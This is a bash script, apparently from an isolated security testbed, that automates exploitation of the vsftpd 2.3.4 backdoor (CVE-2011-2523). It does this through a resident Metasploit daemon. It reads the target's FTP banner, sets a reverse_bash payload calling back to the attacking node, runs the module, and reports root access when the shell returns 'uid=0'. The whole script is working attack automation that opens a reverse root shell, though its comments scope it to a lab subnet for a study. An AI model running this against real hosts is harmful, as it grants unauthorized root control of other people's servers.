#!/usr/bin/env bash
# Pre-staged primitive: vsftpd 2.3.4 backdoor / CVE-2011-2523 (genuine ftp-vsftpd).
#
# STANDARD TOOLING ONLY — this primitive DRIVES the established, maintained Metasploit
# module ``exploit/unix/ftp/vsftpd_234_backdoor``; no exploit is authored here. The module
# sends the historical ":)" smiley in the FTP username, which opens the backdoor root shell
# on tcp/6200, runs ``id`` on that shell, then delivers its command-shell payload there.
# Prints EXACTLY ONE JSON line the courier parses:
#     {"reached_and_executed": <bool>, "unauthorized_access": <bool>}
#
# reached_and_executed = the FTP banner answered and the module ran.
# unauthorized_access  = the backdoor root shell executed ``id`` and returned uid=... (obj_b; the
#                        study treats module success, a session or command output, as obj_b).
#
# Payload note: msf's default payload for this module is a reverse meterpreter; we select
# ``cmd/unix/reverse_bash`` and point LHOST at THIS node's testbed address (the callback
# stays intra-subnet — the node has no egress).
#
# RESIDENT METASPLOIT (2026-10-31). The module runs in the resident Metasploit daemon
# (``msfd``, a service on this node, loopback only: infra/ansible/roles/attacker/files/
# msfd.service), which loaded the framework once. Started fresh for each delivery, msfconsole
# spent most of the old 22 s on Metasploit's own overhead: its start-up, the new shell
# session's verification (a 1-s banner read and a 5-s echo test), a fixed 5-s wait and
# ``sessions -c id`` (another 5-s read window). Exploits are scored when they complete
# (decision A1), so that overhead decided whether a reconfiguration overtook the exploit. Now,
# in one msfd console:
#   - ``sessions -K`` and ``jobs -K`` first: sessions and jobs live in the daemon across
#     deliveries;
#   - ``AutoVerifySession false``: the session registers at once, without the 6-s check;
#   - ``VERBOSE true``: the module prints its own ``id`` result from the backdoor root shell
#     (``UID: uid=0(root) ...``), the obj_b evidence, so no session command is needed;
#   - the session and the payload handler are killed at the end;
#   - ``version`` last, as a sentinel: a conversation cut off part-way (msfd dying or
#     restarting mid-delivery) is never read as a result.
# The primitive prints NO verdict and exits 3 when msfd cannot be reached, sends no line for
# ``MSFD_TIMEOUT_S`` seconds, or closes before the sentinel, and when the payload handler could
# not bind its port (a delivery killed earlier may still hold it): the courier records an
# infrastructure fault, never a failed exploit.
#
# Usage: vsftpd_backdoor.sh <host> <port>   (scoped to 172.31.66.0/24)
set -uo pipefail

HOST="${1:?host}"; PORT="${2:?port}"
LPORT="${VSFTPD_LPORT:-4444}"
MSFD_HOST="${MSFD_HOST:-127.0.0.1}"; MSFD_PORT="${MSFD_PORT:-55554}"
MSFD_TIMEOUT_S="${MSFD_TIMEOUT_S:-90}"

emit() { printf '{"reached_and_executed": %s, "unauthorized_access": %s}\n' "$1" "$2"; }

# Run console commands (one per line) in a new msfd console, then ``version`` as a sentinel, and
# print what the console printed. Non-zero when msfd cannot be reached (3), sends no line for
# MSFD_TIMEOUT_S seconds (124), or closes before answering the sentinel (5, or 141 when it closes
# while the commands are still being sent: SIGPIPE). Bash only (``read -t``), so it needs no
# GNU ``timeout``, and it reads a timeout the same way in bash 3.2 (macOS's /bin/bash, where a
# read that times out returns 1, as at the end of input) and in bash 4 and later (above 128).
msfd_run() {
  local out="" line rc t0
  exec 3<>"/dev/tcp/${MSFD_HOST}/${MSFD_PORT}" || return 3
  printf '%s\nversion\nexit -y\n' "$1" >&3
  while :; do
    line=""
    t0=$SECONDS
    IFS= read -r -t "$MSFD_TIMEOUT_S" line <&3
    rc=$?
    if [ "$rc" -ne 0 ]; then
      out="${out}${line}"  # the last prompt has no newline; msfd closes after ``exit -y``
      break
    fi
    out="${out}${line}
"
  done
  exec 3<&- 3>&-
  if [ "$rc" -gt 128 ] || [ $((SECONDS - t0)) -ge "$MSFD_TIMEOUT_S" ]; then return 124; fi
  case "$out" in *"Framework:"*) ;; *) return 5 ;; esac
  printf '%s\n' "$out"
}

no_verdict() {
  echo "vsftpd_backdoor: $1 (no verdict)" >&2
  exit 3
}

# 1. Reach: read the FTP banner.
BANNER="$(printf 'QUIT\r\n' | nc -w 8 "$HOST" "$PORT" 2>/dev/null | head -n1)"
if [ -z "$BANNER" ]; then emit false false; exit 0; fi

# 2. LHOST = this node's source address on the route to the target (intra-subnet callback).
LHOST="$(ip -4 route get "$HOST" 2>/dev/null | grep -oE 'src [0-9.]+' | awk '{print $2}' | head -n1)"
if [ -z "$LHOST" ]; then emit false false; exit 0; fi

# 3. Drive the maintained module; the backdoor root shell's own `id` output is obj_b.
OUT="$(msfd_run "sessions -K
jobs -K
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS ${HOST}
set RPORT ${PORT}
set PAYLOAD cmd/unix/reverse_bash
set LHOST ${LHOST}
set LPORT ${LPORT}
set AutoVerifySession false
set VERBOSE true
run -z
sessions -K
jobs -K")" || no_verdict "msfd at ${MSFD_HOST}:${MSFD_PORT} did not answer (rc=$?)"

if grep -qE 'UID: uid=[0-9]+' <<<"$OUT"; then
  emit true true
elif grep -qiE 'Handler failed to bind|BindFailed|address is already in use' <<<"$OUT"; then
  no_verdict "the payload handler could not bind port ${LPORT}"
else
  emit true false   # reached + module ran, but the backdoor shell did not answer
fi
